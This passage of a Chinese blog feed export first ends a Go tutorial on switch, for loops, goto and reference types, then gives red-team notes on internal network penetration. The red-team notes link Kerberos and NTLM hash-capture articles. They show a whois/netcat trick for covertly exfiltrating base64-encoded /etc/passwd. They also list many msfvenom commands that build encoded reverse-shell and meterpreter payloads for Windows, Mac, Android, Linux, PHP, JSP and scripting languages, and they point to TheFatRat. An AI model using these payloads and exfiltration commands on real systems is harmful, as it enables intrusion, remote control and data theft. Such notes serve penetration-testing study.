<span class="hljs-number">80</span>: <span class="hljs-comment">//case中判断是否满足条件</span>fmt.Println(<span class="hljs-string">&quot;良好&quot;</span>)<span class="hljs-keyword">default</span>:fmt.Println(<span class="hljs-string">&quot;其他&quot;</span>)&#125;&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">良好</span><span class="hljs-comment">*/</span></code></pre><h4 id="5-3-5-测试多个符合条件的值"><a href="#5-3-5-测试多个符合条件的值" class="headerlink" title="5.3.5 测试多个符合条件的值"></a>5.3.5 测试多个符合条件的值</h4><p><code>case</code> 语句中，可以同时写上多个可能符合条件的值，使用逗号分割它们。例如：<code>case 值1, 值2, 值3</code>。<br>示例：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-keyword">switch</span> grade := <span class="hljs-number">70</span>; grade &#123;<span class="hljs-keyword">case</span> <span class="hljs-number">90</span>:fmt.Println(<span class="hljs-string">&quot;优秀&quot;</span>)<span class="hljs-keyword">case</span> <span class="hljs-number">80</span>:fmt.Println(<span class="hljs-string">&quot;良好&quot;</span>)<span class="hljs-keyword">case</span> <span class="hljs-number">60</span>, <span class="hljs-number">70</span>:fmt.Println(<span class="hljs-string">&quot;及格&quot;</span>)<span class="hljs-keyword">default</span>:fmt.Println(<span class="hljs-string">&quot;不及格&quot;</span>)&#125;&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">及格</span><span class="hljs-comment">*/</span></code></pre><h3 id="5-4-for循环"><a href="#5-4-for循环" class="headerlink" title="5.4 for循环"></a>5.4 for循环</h3><p>Golang 中的循环只有 <code>for</code> 循环。</p><h4 id="5-4-1-基本语法"><a href="#5-4-1-基本语法" class="headerlink" title="5.4.1 基本语法"></a>5.4.1 基本语法</h4><pre><code class="hljs go"><span class="hljs-keyword">package</span> main <span class="hljs-comment">//必须有一个main包</span><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span> <span class="hljs-comment">//导入包含，必须要使用</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-comment">//for初始化条件; 判断条件; 条件变化&#123;</span><span class="hljs-comment">// &#125;</span><span class="hljs-comment">//1+2+3...+100 累加</span>sum := <span class="hljs-number">0</span><span class="hljs-comment">//1) 初始化条件 i := 1</span><span class="hljs-comment">//2) 判断条件是否为真，i &lt;= 100，如果为真，执行循环体，如果为假，跳出循环</span><span class="hljs-comment">//3) 条件变化 i++</span><span class="hljs-comment">//4) 重复2，3，4</span><span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">100</span>; i++ &#123;sum += i&#125;fmt.Println(<span class="hljs-string">&quot;sum = &quot;</span>, sum)&#125;</code></pre><h4 id="5-4-2-基本流程"><a href="#5-4-2-基本流程" class="headerlink" title="5.4.2 基本流程"></a>5.4.2 基本流程</h4><p>1.初始化条件。<br>2.判断条件是否为真，如果为真进入循环体内，如果为假则跳出循环。<br>3.执行条件变化的语句。<br>4.重复 2.3.4 步骤。</p><h4 id="5-4-3-range迭代"><a href="#5-4-3-range迭代" class="headerlink" title="5.4.3 range迭代"></a>5.4.3 range迭代</h4><p>一种自动实现的迭代器，常用于：数组、切片、通道。需要在 <code>for</code> 循环中使用。<br><code>range</code> 有两个返回值：第一个返回值是元素的下标；第二个返回值是元素自身的值。<br>示例：</p><pre><code class="hljs go"><span class="hljs-keyword">package</span> main <span class="hljs-comment">//必须有一个main包</span><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span> <span class="hljs-comment">//导入包含，必须要使用</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;str := <span class="hljs-string">&quot;abc&quot;</span><span class="hljs-comment">//通过for打印每个字符</span><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">len</span>(str); i++ &#123;fmt.Printf(<span class="hljs-string">&quot;str[%d]=%c\n&quot;</span>, i, str[i])&#125;<span class="hljs-comment">//迭代打印每个元素，默认返回2个值：一个是元素的位置，一个是元素本身</span><span class="hljs-keyword">for</span> i, data := <span class="hljs-keyword">range</span> str &#123;fmt.Printf(<span class="hljs-string">&quot;str[%d]=%c\n&quot;</span>, i, data)&#125;<span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> str &#123; <span class="hljs-comment">//第2个返回值，默认丢弃，返回元素的位置（下标）</span>fmt.Printf(<span class="hljs-string">&quot;str[%d]=%c\n&quot;</span>, i, str[i])&#125;<span class="hljs-keyword">for</span> i, _ := <span class="hljs-keyword">range</span> str &#123; <span class="hljs-comment">//第2个返回值，默认丢弃，返回元素的位置（下标）</span>fmt.Printf(<span class="hljs-string">&quot;str[%d]=%c\n&quot;</span>, i, str[i])&#125;&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">str[0]=a</span><span class="hljs-comment">str[1]=b</span><span class="hljs-comment">str[2]=c</span><span class="hljs-comment">str[0]=a</span><span class="hljs-comment">str[1]=b</span><span class="hljs-comment">str[2]=c</span><span class="hljs-comment">str[0]=a</span><span class="hljs-comment">str[1]=b</span><span class="hljs-comment">str[2]=c</span><span class="hljs-comment">str[0]=a</span><span class="hljs-comment">str[1]=b</span><span class="hljs-comment">str[2]=c</span><span class="hljs-comment">*/</span></code></pre><h4 id="5-4-4-几个for循环小案例"><a href="#5-4-4-几个for循环小案例" class="headerlink" title="5.4.4 几个for循环小案例"></a>5.4.4 几个for循环小案例</h4><h5 id="5-4-4-1-九九乘法表"><a href="#5-4-4-1-九九乘法表" class="headerlink" title="5.4.4.1 九九乘法表"></a>5.4.4.1 九九乘法表</h5><p>打印九九乘法表：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-comment">//外层控制共循环几次</span><span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">10</span>; i++ &#123;<span class="hljs-comment">//里层控制每次循环需要计算几次</span><span class="hljs-keyword">for</span> j := <span class="hljs-number">1</span>; j &lt;= i; j++ &#123;fmt.Printf(<span class="hljs-string">&quot;%d x %d = %d\t&quot;</span>, j, i, i*j) <span class="hljs-comment">//1*9的格式来显示</span>&#125;fmt.Println()&#125;&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">1 x 1 = 1</span><span class="hljs-comment">1 x 2 = 2       2 x 2 = 4</span><span class="hljs-comment">1 x 3 = 3       2 x 3 = 6       3 x 3 = 9</span><span class="hljs-comment">1 x 4 = 4       2 x 4 = 8       3 x 4 = 12      4 x 4 = 16</span><span class="hljs-comment">1 x 5 = 5       2 x 5 = 10      3 x 5 = 15      4 x 5 = 20      5 x 5 = 25</span><span class="hljs-comment">1 x 6 = 6       2 x 6 = 12      3 x 6 = 18      4 x 6 = 24      5 x 6 = 30      6 x 6 = 36</span><span class="hljs-comment">1 x 7 = 7       2 x 7 = 14      3 x 7 = 21      4 x 7 = 28      5 x 7 = 35      6 x 7 = 42      7 x 7 = 49</span><span class="hljs-comment">1 x 8 = 8       2 x 8 = 16      3 x 8 = 24      4 x 8 = 32      5 x 8 = 40      6 x 8 = 48      7 x 8 = 56      8 x 8 = 64</span><span class="hljs-comment">1 x 9 = 9       2 x 9 = 18      3 x 9 = 27      4 x 9 = 36      5 x 9 = 45      6 x 9 = 54      7 x 9 = 63      8 x 9 = 72      9 x 9 = 81</span><span class="hljs-comment">*/</span></code></pre><h5 id="5-4-4-2-冒泡排序"><a href="#5-4-4-2-冒泡排序" class="headerlink" title="5.4.4.2 冒泡排序"></a>5.4.4.2 冒泡排序</h5><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Bubbling</span><span class="hljs-params">(sli []<span class="hljs-keyword">int</span>)</span></span> &#123;length := <span class="hljs-built_in">len</span>(sli)<span class="hljs-comment">//外层控制共循环几次</span><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; length<span class="hljs-number">-1</span>; i++ &#123;<span class="hljs-comment">//里层控制每个元素都参与比较</span><span class="hljs-keyword">for</span> j := i + <span class="hljs-number">1</span>; j &lt; length<span class="hljs-number">-1</span>; j++ &#123;<span class="hljs-keyword">if</span> sli[i] &lt; sli[j] &#123; <span class="hljs-comment">//策略：大的数字放在前面</span>sli[i], sli[j] = sli[j], sli[i]&#125;&#125;&#125;&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;sli := []<span class="hljs-keyword">int</span>&#123;<span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>&#125;fmt.Println(<span class="hljs-string">&quot;before bubbling:&quot;</span>, sli)Bubbling(sli)fmt.Println(<span class="hljs-string">&quot;after bubbling:&quot;</span>, sli)&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">before bubbling: [5 9 10 3 6 1 0 7 8 4 2 0]</span><span class="hljs-comment">after bubbling: [10 9 8 7 6 5 4 3 2 1 0 0]</span><span class="hljs-comment">*/</span></code></pre><h3 id="5-5-跳转语句"><a href="#5-5-跳转语句" class="headerlink" title="5.5 跳转语句"></a>5.5 跳转语句</h3><h4 id="5-5-1-break"><a href="#5-5-1-break" class="headerlink" title="5.5.1 break"></a>5.5.1 break</h4><p><code>break</code> 可以用在 <code>for</code>、<code>switch</code>、<code>select</code>。</p><h4 id="5-5-2-continue"><a href="#5-5-2-continue" class="headerlink" title="5.5.2 continue"></a>5.5.2 continue</h4><p><code>continue</code> 只能用在 <code>for</code> 循环中！</p><h4 id="5-5-3-break和continue不能同时出现在同一级语句块中"><a href="#5-5-3-break和continue不能同时出现在同一级语句块中" class="headerlink" title="5.5.3 break和continue不能同时出现在同一级语句块中"></a>5.5.3 break和continue不能同时出现在同一级语句块中</h4><p><code>break</code> 和 <code>continue</code> 同时出现在同一级语句块中，就会自相矛盾，导致另一个语句无法到达！</p><h3 id="5-6-goto"><a href="#5-6-goto" class="headerlink" title="5.6 goto"></a>5.6 goto</h3><p><code>goto</code> 可以在任何地方使用，但不能跨函数使用。<br><strong>不建议使用，因为会破坏程序的结构</strong>！</p><h4 id="5-6-1-goto不能跨函数使用"><a href="#5-6-1-goto不能跨函数使用" class="headerlink" title="5.6.1 goto不能跨函数使用"></a>5.6.1 goto不能跨函数使用</h4><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">testFunc</span><span class="hljs-params">()</span></span> &#123;END:fmt.Println(<span class="hljs-string">&quot;this is testFunc.&quot;</span>)&#125;<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-keyword">goto</span> END&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">.\main.go:6:1: label END defined and not used</span><span class="hljs-comment">.\main.go:11:7: label END not defined</span><span class="hljs-comment">*/</span></code></pre><h4 id="5-6-2-goto无条件跳转"><a href="#5-6-2-goto无条件跳转" class="headerlink" title="5.6.2 goto无条件跳转"></a>5.6.2 goto无条件跳转</h4><p>程序遇到 <code>goto</code> 语句，将会无条件强制跳转。</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;fmt.Println(<span class="hljs-string">&quot;111&quot;</span>)<span class="hljs-keyword">goto</span> END <span class="hljs-comment">//自定义标签名，无条件强制跳转去该标签的所在代码块</span>fmt.Println(<span class="hljs-string">&quot;3333&quot;</span>) <span class="hljs-comment">//此行代码永远无法到达</span>END:fmt.Println(<span class="hljs-string">&quot;END target&quot;</span>)&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">111</span><span class="hljs-comment">END target</span><span class="hljs-comment">*/</span></code></pre><p>尝试将上面代码中的 END 标签和其代码块放到 main() 函数的第一行，会发生什么情况？<br>程序进入死循环，没完没了地一直在跳转。</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;END:fmt.Println(<span class="hljs-string">&quot;END target&quot;</span>)fmt.Println(<span class="hljs-string">&quot;111&quot;</span>)<span class="hljs-keyword">goto</span> ENDfmt.Println(<span class="hljs-string">&quot;3333&quot;</span>)&#125;</code></pre><h4 id="5-6-3-goto-的使用场景示例"><a href="#5-6-3-goto-的使用场景示例" class="headerlink" title="5.6.3 goto 的使用场景示例"></a>5.6.3 goto 的使用场景示例</h4><p>有这么一个场景：打印 1 ~ 10，不能用 <code>for</code> 循环。<br>用 <code>goto</code> 就能很容易实现需求：</p><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;n := <span class="hljs-number">1</span>LOOP: <span class="hljs-comment">// 定义 goto 的标签，以及实现代码逻辑</span>fmt.Printf(<span class="hljs-string">&quot;%d &quot;</span>, n)n++<span class="hljs-keyword">if</span> n &lt;= <span class="hljs-number">10</span> &#123;<span class="hljs-keyword">goto</span> LOOP <span class="hljs-comment">// 跳转到该标签</span>&#125;&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">1 2 3 4 5 6 7 8 9 10 </span><span class="hljs-comment">*/</span></code></pre><p>以上代码，也是运用了循环的思维模式，只是换了跳转的方式而已。<br>还有一种方式就是递归：</p><pre><code class="hljs go"><span class="hljs-keyword">var</span> n = <span class="hljs-number">1</span><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-keyword">if</span> n &lt;= <span class="hljs-number">10</span> &#123;fmt.Printf(<span class="hljs-string">&quot;%d &quot;</span>, n)n++main()&#125;&#125;<span class="hljs-comment">/*</span><span class="hljs-comment">运行结果：</span><span class="hljs-comment">1 2 3 4 5 6 7 8 9 10</span><span class="hljs-comment">*/</span></code></pre><p>递归是循环的另一种表现形式。</p><h2 id="六、值类型-amp-amp-引用类型"><a href="#六、值类型-amp-amp-引用类型" class="headerlink" title="六、值类型 &amp;&amp; 引用类型"></a>六、值类型 &amp;&amp; 引用类型</h2><h3 id="6-1-值类型"><a href="#6-1-值类型" class="headerlink" title="6.1 值类型"></a>6.1 值类型</h3><pre><code class="hljs go"><span class="hljs-keyword">bool</span><span class="hljs-keyword">int</span>(<span class="hljs-number">32</span> or <span class="hljs-number">64</span>), <span class="hljs-keyword">int8</span>, <span class="hljs-keyword">int16</span>, <span class="hljs-keyword">int32</span>, <span class="hljs-keyword">int64</span><span class="hljs-keyword">uint</span>(<span class="hljs-number">32</span> or <span class="hljs-number">64</span>), <span class="hljs-keyword">uint8</span>(<span class="hljs-keyword">byte</span>), <span class="hljs-keyword">uint16</span>, <span class="hljs-keyword">uint32</span>, <span class="hljs-keyword">uint64</span><span class="hljs-keyword">float32</span>, <span class="hljs-keyword">float64</span><span class="hljs-keyword">string</span><span class="hljs-keyword">complex64</span>, <span class="hljs-keyword">complex128</span>array <span class="hljs-comment">// 固定长度的数组</span></code></pre><h3 id="6-2-引用类型"><a href="#6-2-引用类型" class="headerlink" title="6.2 引用类型"></a>6.2 引用类型</h3><p>Golang 中，只有这几个引用类型：</p><pre><code class="hljs go">slice      <span class="hljs-comment">// 切片</span><span class="hljs-keyword">map</span>    <span class="hljs-comment">// HashMap</span>pointer    <span class="hljs-comment">//指针类型</span>channel    <span class="hljs-comment">//管道（通道）</span><span class="hljs-keyword">interface</span>  <span class="hljs-comment">//接口</span>function   <span class="hljs-comment">//函数</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>编程之美</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红队攻防学习之内网渗透基础</title>
    <link href="/p/5a00e178.html"/>
    <url>/p/5a00e178.html</url>
    
    <content type="html"><![CDATA[<h1 id="八、内网渗透基础"><a href="#八、内网渗透基础" class="headerlink" title="八、内网渗透基础"></a>八、内网渗透基础</h1><h2 id="8-1-Kerberos协议"><a href="#8-1-Kerberos协议" class="headerlink" title="8.1 Kerberos协议"></a>8.1 Kerberos协议</h2><h3 id="8-1-1-Windows认证原理之Kerberos篇"><a href="#8-1-1-Windows认证原理之Kerberos篇" class="headerlink" title="8.1.1 Windows认证原理之Kerberos篇"></a>8.1.1 Windows认证原理之Kerberos篇</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">5004</span>  ---Kerberos Securityhttps:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/artech/</span>archive<span class="hljs-regexp">/2011/</span><span class="hljs-number">01</span><span class="hljs-regexp">/24/</span>kerberos.html   ---Windows安全认证是如何进行的？[Kerberos篇]https:<span class="hljs-regexp">//</span>cloud.tencent.com<span class="hljs-regexp">/developer/</span>article/<span class="hljs-number">1596509</span>   --Windows认证 | 域认证https:<span class="hljs-regexp">//</span>www.anquanke.com<span class="hljs-regexp">/post/i</span>d/<span class="hljs-number">190261</span>   --Windows内网协议学习Kerberos篇之ASREQ&amp; ASREP （深入理解）</code></pre><p>这四篇文章，仔细看完，你会基本理解Kerberos原理…</p><hr><h2 id="8-2-NTLM"><a href="#8-2-NTLM" class="headerlink" title="8.2 NTLM"></a>8.2 NTLM</h2><h3 id="8-2-1-NTLM协议及Hash抓取"><a href="#8-2-1-NTLM协议及Hash抓取" class="headerlink" title="8.2.1 NTLM协议及Hash抓取"></a>8.2.1 NTLM协议及Hash抓取</h3><p>Windows安全认证有两种方式：Kerberos和NTLM</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">6600</span>https:<span class="hljs-regexp">//</span>cloud.tencent.com<span class="hljs-regexp">/developer/</span>article/<span class="hljs-number">1480923</span></code></pre><p>这两篇诠释了NTLM协议及Hash抓取…</p><hr><h3 id="8-2-2-Windows认证原理之NTLM篇"><a href="#8-2-2-Windows认证原理之NTLM篇" class="headerlink" title="8.2.2 Windows认证原理之NTLM篇"></a>8.2.2 Windows认证原理之NTLM篇</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//my</span>.oschina.net<span class="hljs-regexp">/u/</span><span class="hljs-number">4587410</span><span class="hljs-regexp">/blog/</span><span class="hljs-number">4435334</span>   ---Windows认证原理入门篇https:<span class="hljs-regexp">//</span>www.anquanke.com<span class="hljs-regexp">/post/i</span>d/<span class="hljs-number">193149</span>   ---Windows内网协议学习NTLM篇之NTLM基础介绍https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/-qing-/</span>p/<span class="hljs-number">11343859</span>.html   ---域渗透基础之NTLM认证协议</code></pre><p>书上只是基础的讲解了，这里三篇文章详细深入的讲解了NTLM</p><hr><h2 id="8-3-内网命令行渗透笔记"><a href="#8-3-内网命令行渗透笔记" class="headerlink" title="8.3 内网命令行渗透笔记"></a>8.3 内网命令行渗透笔记</h2><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/bmjoker/</span>p/<span class="hljs-number">10336247</span>.html  https:<span class="hljs-regexp">//</span>cloud.tencent.com<span class="hljs-regexp">/developer/</span>article/<span class="hljs-number">1665868</span>https:<span class="hljs-regexp">//</span>www.mi1k7ea.com<span class="hljs-regexp">/2020/</span><span class="hljs-number">02</span><span class="hljs-regexp">/27/</span>内网信息收集之本机信息收集/https:<span class="hljs-regexp">//uu</span>zdaisuki.com<span class="hljs-regexp">/2018/</span><span class="hljs-number">05</span><span class="hljs-regexp">/05/</span>内网渗透常用命令总结（windows）/https:<span class="hljs-regexp">//my</span>.oschina.net<span class="hljs-regexp">/u/</span><span class="hljs-number">4399281</span><span class="hljs-regexp">/blog/</span><span class="hljs-number">3581418</span></code></pre><p>这里集合很多，学会就基本差不多了，我的笔记我不透漏了，大部分是htb上集合的和文章里的…</p><hr><h2 id="8-4-内网渗透中的文件传输"><a href="#8-4-内网渗透中的文件传输" class="headerlink" title="8.4 内网渗透中的文件传输"></a>8.4 内网渗透中的文件传输</h2><p><strong>利用whois传输文件：</strong></p><p>传输机：</p><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@john:~# whois -h <span class="hljs-number">127.0.0.1</span> -p <span class="hljs-number">4444</span> `cat /etc/passwd | base<span class="hljs-number">64</span>`</code></pre><p>接受机：</p><pre><code class="hljs awk">root@john:<span class="hljs-regexp">/tmp# nc -l -v -p 4444 | sed &quot;s/</span> <span class="hljs-regexp">//g</span><span class="hljs-string">&quot; | base64 -d</span></code></pre><p>优点：适用于隐蔽传输。最小化被发现。<br>缺点：适用于传输小文件。</p><hr><h2 id="8-5-msfvenom常用生成payload命令"><a href="#8-5-msfvenom常用生成payload命令" class="headerlink" title="8.5 msfvenom常用生成payload命令"></a>8.5 msfvenom常用生成payload命令</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows:"></a><strong>windows:</strong></h3><pre><code class="hljs apache"><span class="hljs-attribute">msfvenom</span> -a x<span class="hljs-number">86</span> --platform Windows -p windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -e x<span class="hljs-number">86</span>/shikata_ga_nai -b &#x27;x<span class="hljs-number">00</span>x<span class="hljs-number">0</span>axff&#x27; -i <span class="hljs-number">3</span> -f exe -opayload.exe</code></pre><h3 id="mac"><a href="#mac" class="headerlink" title="mac:"></a><strong>mac:</strong></h3><pre><code class="hljs routeros">msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=攻击机IP<span class="hljs-attribute">LPORT</span>=攻击机端口 -f macho -o payload.macho</code></pre><h3 id="android"><a href="#android" class="headerlink" title="android:"></a><strong>android:</strong></h3><pre><code class="hljs awk"><span class="hljs-regexp">//</span>需要签名msfvenom -a x86 --platform Android -p android<span class="hljs-regexp">/meterpreter/</span>reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f apk -o payload.apk</code></pre><h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell:"></a><strong>powershell:</strong></h3><pre><code class="hljs routeros">msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=攻击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -e cmd/powershell_base64 -i 3 -f<span class="hljs-built_in"> raw </span>-o payload.ps1</code></pre><h3 id="linux"><a href="#linux" class="headerlink" title="linux:"></a><strong>linux:</strong></h3><pre><code class="hljs routeros">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=攻击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -f elf -o payload.elf</code></pre><h3 id="php"><a href="#php" class="headerlink" title="php:"></a><strong>php:</strong></h3><pre><code class="hljs routeros">msfvenom -p php/meterpreter_reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.phpcat shell.php | pbcopy &amp;&amp; echo <span class="hljs-string">&#x27;&lt;?php &#x27;</span> | tr -d <span class="hljs-string">&#x27;n&#x27;</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</code></pre><h3 id="aspx"><a href="#aspx" class="headerlink" title="aspx:"></a><strong>aspx:</strong></h3><pre><code class="hljs awk">msfvenom -a x86 --platform windows -p windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f aspx -o payload.aspx</code></pre><h3 id="jsp"><a href="#jsp" class="headerlink" title="jsp:"></a><strong>jsp:</strong></h3><pre><code class="hljs routeros">msfvenom --platform java -p java/jsp_shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=攻击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -f<span class="hljs-built_in"> raw </span>-o payload.jsp</code></pre><h3 id="war"><a href="#war" class="headerlink" title="war:"></a><strong>war:</strong></h3><pre><code class="hljs routeros">msfvenom -p java/jsp_shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=攻击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -f<span class="hljs-built_in"> raw </span>-o payload.war</code></pre><h3 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs:"></a><strong>nodejs:</strong></h3><pre><code class="hljs routeros">msfvenom -p nodejs/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=攻击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -f<span class="hljs-built_in"> raw </span>-opayload.js</code></pre><h3 id="python"><a href="#python" class="headerlink" title="python:"></a><strong>python:</strong></h3><pre><code class="hljs routeros">msfvenom -p python/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=攻击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -f<span class="hljs-built_in"> raw </span>-o payload.py</code></pre><h3 id="perl"><a href="#perl" class="headerlink" title="perl:"></a><strong>perl:</strong></h3><pre><code class="hljs routeros">msfvenom -p cmd/unix/reverse_perl <span class="hljs-attribute">LHOST</span>=攻击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -f<span class="hljs-built_in"> raw </span>-opayload.pl</code></pre><h3 id="ruby"><a href="#ruby" class="headerlink" title="ruby:"></a><strong>ruby:</strong></h3><pre><code class="hljs routeros">msfvenom -p ruby/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=攻击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -f<span class="hljs-built_in"> raw </span>-opayload.rb</code></pre><h3 id="lua"><a href="#lua" class="headerlink" title="lua:"></a><strong>lua:</strong></h3><pre><code class="hljs routeros">msfvenom -p cmd/unix/reverse_lua <span class="hljs-attribute">LHOST</span>=攻击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -f<span class="hljs-built_in"> raw </span>-opayload.lua</code></pre><h3 id="windows-shellcode"><a href="#windows-shellcode" class="headerlink" title="windows shellcode:"></a><strong>windows shellcode:</strong></h3><pre><code class="hljs awk">msfvenom -a x86 --platform Windows -p windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c</code></pre><h3 id="linux-shellcode"><a href="#linux-shellcode" class="headerlink" title="linux shellcode:"></a><strong>linux shellcode:</strong></h3><pre><code class="hljs routeros">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=攻击机IP <span class="hljs-attribute">LPORT</span>=攻击机端口 -f c</code></pre><h3 id="mac-shellcode"><a href="#mac-shellcode" class="headerlink" title="mac shellcode:"></a><strong>mac shellcode:</strong></h3><pre><code class="hljs routeros">msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=攻击机IP<span class="hljs-attribute">LPORT</span>=攻击机端口 -f c</code></pre><h3 id="便捷化payload生成"><a href="#便捷化payload生成" class="headerlink" title="便捷化payload生成:"></a><strong>便捷化payload生成:</strong></h3><p>项目地址:</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/Screetsec/</span>TheFatRat</code></pre><pre><code class="hljs awk">root@John:~<span class="hljs-regexp">/Desktop# git clone https:/</span><span class="hljs-regexp">/github.com/</span>Screetsec/TheFatRat.git<span class="hljs-regexp">//</span>设置时需要挂墙</code></pre><p><strong>附录:</strong><br><strong>中文使用说明:</strong><br><strong>Options:</strong></p><pre><code class="hljs livecodeserver">-p, <span class="hljs-comment">--payload &lt;payload&gt; 使用指定的payload</span><span class="hljs-comment">--payload-options 列出该payload参数</span>-l, <span class="hljs-comment">--list [type] 列出所有的payloads</span>-n, <span class="hljs-comment">--nopsled &lt;length&gt; 为payload指定一个 nopsled 长度</span>-f, <span class="hljs-comment">--format &lt;format&gt; 指定payload生成格式</span><span class="hljs-comment">--help-formats 查看所有支持格式</span>-e, <span class="hljs-comment">--encoder &lt;encoder&gt; 使用编码器</span>-<span class="hljs-keyword">a</span>, <span class="hljs-comment">--arch &lt;arch&gt; 指定payload构架</span><span class="hljs-comment">--platform &lt;platform&gt; 指定payload平台</span><span class="hljs-comment">--help-platforms 显示支持的平台</span>-s, <span class="hljs-comment">--space &lt;length&gt; 设定payload攻击荷载的最大长度</span><span class="hljs-comment">--encoder-space &lt;length&gt; The maximum size of the encoded payload</span>(defaults <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> -s <span class="hljs-built_in">value</span>)-b, <span class="hljs-comment">--bad-chars &lt;list&gt; 指定bad-chars 如: &#x27;x00xff&#x27;</span>-i, <span class="hljs-comment">--iterations &lt;count&gt; 指定编码次数</span>-c, <span class="hljs-comment">--add-code &lt;path&gt; 指定个win32 shellcode 文件</span>-x, 